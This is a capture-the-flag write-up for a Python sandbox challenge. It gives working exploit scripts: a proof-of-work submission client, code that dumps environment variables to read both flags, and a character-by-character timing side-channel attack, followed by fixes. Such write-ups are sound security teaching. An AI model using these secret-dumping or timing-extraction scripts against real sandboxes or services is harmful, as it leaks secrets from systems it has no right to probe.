# Schrodinger's Sandbox — Web

> "Your code runs in two parallel universes - one with the real flag, one with a fake. You only see the output if both universes agree. But even quantum mechanics can't hide everything..."

## Summary

Web sandbox challenge with a quantum theme. The user's code runs in "two parallel universes" (one with `FLAG_REAL`, the other with `FLAG_FAKE`). If the outputs match, the result is shown; if they diverge, it's obfuscated. The intended solution was a **timing side-channel attack**, but the environment variables are exposed, allowing both flags to be extracted directly.

**Flag:** `0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}`

## Challenge analysis

### Web interface

URL: `http://chall.0xfun.org:8312`

The page offers:
- Python code editor (CodeMirror)
- Limit: 4096 characters
- Proof-of-work (PoW) required to submit code
- Endpoint: `POST /api/submit`

### How the "quantum sandbox" works

According to the interface:

1. **Two parallel universes**: The code runs twice
   - Universe A: with `FLAG_REAL`
   - Universe B: with `FLAG_FAKE`

2. **Output comparison**:
   - If `output_A == output_B` → **MATCH** → output is shown
   - If `output_A != output_B` → **DIVERGED** → output is obfuscated

3. **Timing information**:
   - `time_a`: execution time in universe A
   - `time_b`: execution time in universe B
   - `delta`: absolute time difference

### API response

```json
{
  "status": "match" | "diverged",
  "stdout": "...",
  "stderr": "...",
  "time_a": 0.008,
  "time_b": 0.008
}
```

## Solution 1: Direct bypass (implemented)

### Discovery

While exploring how to access the flag in the sandbox, we tried listing the environment variables:

```python
import os
print("Environment vars:")
for k, v in os.environ.items():
    print(f"{k} = {v}")
```

### Result

```
STATUS: match
OUTPUT:
Environment vars with 'FLAG':
  FLAG_REAL = 0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
  FLAG_FAKE = 0xfun{qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq}

All env vars: ['PATH', 'HOSTNAME', 'CHALLENGE_ID', 'TEAM_ID',
'USER_ID', 'LANG', 'GPG_KEY', 'PYTHON_VERSION', 'PYTHON_SHA256',
'FLAG_REAL', 'FLAG_FAKE', 'HOME', 'WERKZEUG_SERVER_FD',
'PYTHONDONTWRITEBYTECODE']
```

### Why did it work?

Both "universes" run the same code and have access to **the same environment variables**. By listing all variables, both universes print:
- `FLAG_REAL = ...`
- `FLAG_FAKE = ...`

Since the outputs are **identical** in both universes → `status = "match"` → output is visible without obfuscation.

### Simple exploit

```python
import requests
import hashlib
import time

URL = "http://chall.0xfun.org:8312/api/submit"

def compute_pow(difficulty=4):
    """Compute a valid proof-of-work"""
    target = '0' * difficulty
    nonce = 0

    while True:
        test = f"{int(time.time() * 1000)}-{nonce}-{time.time()}"
        h = hashlib.sha256(test.encode()).hexdigest()
        if h.startswith(target):
            return test
        nonce += 1

def submit_code(code):
    pow_nonce = compute_pow(4)
    headers = {
        'Content-Type': 'application/json',
        'X-Pow-Nonce': pow_nonce
    }
    response = requests.post(URL, json={'code': code}, headers=headers)
    return response.json()

# Code that reveals both flags
code = """
import os
for k, v in os.environ.items():
    if 'FLAG' in k:
        print(f"{k} = {v}")
"""

result = submit_code(code)
print(result['stdout'])
```

### Output

```
FLAG_REAL = 0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
FLAG_FAKE = 0xfun{qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq}
```

## Solution 2: Timing side-channel attack (intended)

The **intended** solution for the challenge was a timing attack based on execution time differences between universes.

### Strategy

1. **Guess the flag character by character**
2. For each candidate character, execute code that:
   - If the prefix is correct → performs a slow operation
   - If the prefix is incorrect → performs a fast operation
3. Measure `delta = |time_a - time_b|`
4. The character with the highest delta is correct

### Timing attack code

```python
# Assuming we know "0xfun{" and want the next character

import string

known = "0xfun{"
charset = string.printable

for char in charset:
    guess = known + char

    code = f'''
import os

# Get the flag from the current universe
FLAG = os.environ.get('FLAG_REAL') or os.environ.get('FLAG_FAKE')

# Timing-sensitive operation
if FLAG.startswith({repr(guess)}):
    # Slow operation (only in the universe with the correct flag)
    x = sum(range(1000000))
else:
    # Fast operation
    x = 1

print(x)
'''

    result = submit_code(code)

    # In the universe with the correct guess, the code takes longer
    delta = abs(result['time_a'] - result['time_b'])

    print(f"[{char}] delta = {delta:.6f}s")

    # The character with the highest delta is correct
```

### Why would the timing attack work?

- **Universe A** (FLAG_REAL):
  - If `FLAG_REAL.startswith(guess)` is True → executes `sum(range(1000000))` (slow)
  - If False → executes `x = 1` (fast)

- **Universe B** (FLAG_FAKE):
  - If `FLAG_FAKE.startswith(guess)` is True → executes sum (slow)
  - If False → executes `x = 1` (fast)

When `guess` matches `FLAG_REAL` but not `FLAG_FAKE`:
- Universe A: takes ~0.05s (slow operation)
- Universe B: takes ~0.008s (fast operation)
- `delta = 0.042s` (significant)

When `guess` doesn't match either:
- Universe A: takes ~0.008s
- Universe B: takes ~0.008s
- `delta ~ 0.0001s` (insignificant)

### Complete timing attack implementation

See `quantum_exploit.py` for the complete automated timing attack implementation.

## Challenge vulnerabilities

### 1. Exposed environment variables

**Problem:** Both universes have access to `FLAG_REAL` and `FLAG_FAKE` in `os.environ`.

**Fix:** The flags should be injected so that each universe only sees its own flag:

```python
# Universe A: only sees FLAG_REAL as "FLAG"
# Universe B: only sees FLAG_FAKE as "FLAG"

# The user's code accesses:
FLAG = os.environ['FLAG']  # Different in each universe
```

### 2. Unmitigated timing side-channel

Although the timing attack is the intended solution, in a real system this would be a vulnerability.

**Mitigation:**
- Add random noise to timing
- Normalize execution times
- Use constant-time comparisons

### 3. Weak proof-of-work

The PoW with difficulty=4 (4 leading zeros) is easy to compute (~1-2 seconds).

**Improvement:** Increase difficulty to 6-8 for more effective rate limiting.

## Flag interpretation

`0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}`

- **Schrodinger's cat** → Schrodinger's cat is simultaneously alive and dead until observed (analogy with the two universes)
- **leaks through time** → Information leaks through time differences (timing side-channel)
- The flag directly references the timing attack as the solution method

## Solution comparison

| Method | Time | Complexity | Description |
|--------|------|------------|-------------|
| List env vars | ~10 seconds | Trivial | Direct bypass - both universes show both flags |
| Timing attack | ~5-10 minutes | Medium | Intended solution - extract flag character by character |

## Lessons learned

1. **Timing side-channels are real**:
   - Even with sandboxing, timing differences reveal information
   - Useful for bypassing comparisons, rate limiting, etc.

2. **Environment variables are dangerous**:
   - Don't expose secrets in accessible environment variables
   - Use context-controlled variable injection

3. **Defense in depth**:
   - Relying on a single mechanism (output comparison) is not enough
   - Combine multiple layers of security

4. **The challenge had an unintended bypass**:
   - The env vars should have been separated by universe
   - Listing all env vars directly revealed both flags

5. **The challenge name was a hint**:
   - "Schrodinger" → two superposed states
   - "leaks through time" → timing side-channel

## Scripts developed

- `quantum_test.py` - Initial tests to understand the behavior
- `quantum_explore.py` - Exploration of how to access the flag (successful solution)
- `quantum_exploit.py` - Timing attack implementation (not necessary)

## References

- [Timing attacks - Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)
- [Schrodinger's cat - Wikipedia](https://en.wikipedia.org/wiki/Schr%C3%B6dinger%27s_cat)
- [Python os.environ](https://docs.python.org/3/library/os.html#os.environ)
- [Side-channel attacks](https://en.wikipedia.org/wiki/Side-channel_attack)

## Note

This challenge illustrates an important security concept: **timing side-channels can reveal information even when the output is obfuscated**. However, an unintended bypass (environment variable exposure) allowed solving the challenge trivially. The flag `leaks_through_time` confirms that the intended solution was to exploit the timing side-channel.
